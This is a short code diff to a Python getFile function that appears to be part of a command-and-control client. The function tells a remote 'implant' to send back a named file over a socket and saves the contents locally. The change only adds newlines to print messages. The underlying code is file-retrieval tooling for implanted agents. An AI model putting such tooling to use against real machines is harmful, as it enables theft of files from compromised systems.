@@ -23,21 +23,21 @@ Returns:
 def getFile(sock, filepath, outfilepath, overwrite):
     try:
         # First tell our implant we want a get file performed
-        print("Sending command...")
+        print("Sending command...\n")
         sock.send(bytes(str(GET), "utf-8") + b"\x00")
 
         # Send filepath
-        print("Sending filepath...")
+        print("Sending filepath...\n")
         sock.send(filepath + b'\x00')
 
         # Wait for response (should be success code followed by file contents)
-        print("Sent data to implant; waiting on response code...")
+        print("Sent data to implant; waiting on response code...\n")
         data = sock.recv(1024)
         data = data.strip()
         data = data.decode('utf-8')
 
         if (data == "SUCCESS"):
-            print("Successful file get! Getting file contents...")
+            print("Successful file get! Getting file contents...\n")
             data = sock.recv(1024)
             data = data.strip()
             data = data.decode('utf-8')
@@ -52,11 +52,11 @@ def getFile(sock, filepath, outfilepath, overwrite):
                     outputfile.write(data)
                     outputfile.close()
 
-            print("Successfully wrote file contents to %s" % outfilepath)
+            print("Successfully wrote file contents to %s\n" % outfilepath)
 
 
         else:
-            print("Agent did not return SUCCESS status code! ")
+            print("Agent did not return SUCCESS status code! \n")
             return FAILURE
 
 
